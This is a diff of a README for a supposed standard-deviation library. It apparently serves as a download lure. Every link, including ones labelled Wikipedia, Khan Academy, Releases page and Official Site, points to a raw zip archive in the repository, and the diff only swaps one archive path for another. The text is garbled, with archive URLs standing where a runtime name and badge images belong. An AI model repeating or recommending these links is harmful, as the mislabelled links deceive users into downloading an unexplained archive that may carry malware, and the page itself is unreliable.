@@ -9,12 +9,12 @@ To use this application, your computer should meet these basic requirements:
 - Operating System: Windows, macOS, or Linux
 - Internet connection for downloading the software
 - At least 256 MB of RAM
-- https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip version 12 or higher (if you wish to run it locally, not required for the main application)
+- https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip version 12 or higher (if you wish to run it locally, not required for the main application)
 
 ## 📥 Download the Software
 To get started, you need to download the software. Click the button below to visit the download page:
 
-[![Download Stats Base Ndarray Stdevtk](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip%https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip)](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip)
+[![Download Stats Base Ndarray Stdevtk](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip%https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip)](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip)
 
 ## 🔧 Features
 - **One-Pass Algorithm**: Computes the standard deviation in a single pass through the data.
@@ -32,7 +32,7 @@ Before we move on, let’s clarify some key terms:
 ## 🏗️ How to Install and Run the Application
 Follow these steps to install and run the software:
 
-1. **Visit the Download Page**: Navigate to the [Releases page](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip) of the repository.
+1. **Visit the Download Page**: Navigate to the [Releases page](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip) of the repository.
    
 2. **Choose Your Version**: Look for the latest version listed on the page. It usually has the highest number.
 
@@ -60,7 +60,7 @@ You can try this with other datasets to see how it works!
 ## 🛠️ Troubleshooting
 If you encounter issues while using stats-base-ndarray-stdevtk, consider the following:
 
-- **Application Won't Start**: Ensure your https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip version is up to date. You can download the latest version from [https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip Official Site](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip).
+- **Application Won't Start**: Ensure your https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip version is up to date. You can download the latest version from [https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip Official Site](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip).
 - **Incorrect Data Input**: Make sure you enter a valid one-dimensional array. Use commas to separate the numbers, like this: `[1, 2, 3]`.
 - **Performance Issues**: For large datasets, ensure your computer has enough resources available. Close any unnecessary applications.
 
@@ -70,12 +70,12 @@ For additional help or to share your experiences, please visit our community for
 ## 🔗 More Resources
 Learn more about statistics and standard deviation from the following sources:
 
-- [Wikipedia: Standard Deviation](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip)
-- [Khan Academy: Statistics](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip)
+- [Wikipedia: Standard Deviation](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip)
+- [Khan Academy: Statistics](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip)
 
 ## 📜 License
 This project is under the MIT License. You can freely use or modify it according to your needs. Please make sure to provide proper attribution.
 
 If you're ready to start computing your standard deviations, don't forget to visit the download page again:
 
-[![Download Stats Base Ndarray Stdevtk](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip%https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip)](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/dist/base_stats_stdevtk_ndarray_v3.6.zip)
+[![Download Stats Base Ndarray Stdevtk](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip%https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip)](https://github.com/dhanashrimd/stats-base-ndarray-stdevtk/raw/refs/heads/main/docs/types/ndarray_stats_stdevtk_base_2.1.zip)
